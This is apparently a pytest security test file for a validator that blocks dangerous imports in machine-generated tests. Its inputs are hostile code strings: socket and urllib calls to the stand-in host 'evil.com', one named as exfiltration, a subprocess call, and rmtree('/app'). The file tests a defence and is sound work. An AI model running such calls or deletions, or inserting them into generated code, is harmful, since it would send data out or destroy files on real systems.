"""Security tests: Test validator blocking dangerous generated tests."""

import pytest

from adversary.core.errors import TestGenerationError
from adversary.test_generation.validator import TestValidator


def test_blocks_socket_and_network() -> None:
    validator = TestValidator()
    code = "import socket\ndef test_exfil(): socket.socket().connect(('evil.com', 80))"
    with pytest.raises(TestGenerationError, match="Disallowed module import in test: socket"):
        validator.validate(code)


def test_blocks_urllib_http() -> None:
    validator = TestValidator()
    code = "import urllib.request\ndef test_dl(): urllib.request.urlopen('http://evil.com')"
    with pytest.raises(TestGenerationError, match="Disallowed module import in test: urllib"):
        validator.validate(code)


def test_blocks_subprocess_execution() -> None:
    validator = TestValidator()
    code = "import subprocess\ndef test_cmd(): subprocess.run(['ls'])"
    with pytest.raises(TestGenerationError, match="Disallowed module import in test: subprocess"):
        validator.validate(code)


def test_blocks_shutil_deletion() -> None:
    validator = TestValidator()
    code = "from shutil import rmtree\ndef test_rm(): rmtree('/app')"
    with pytest.raises(TestGenerationError, match="Disallowed module import in test: shutil"):
        validator.validate(code)

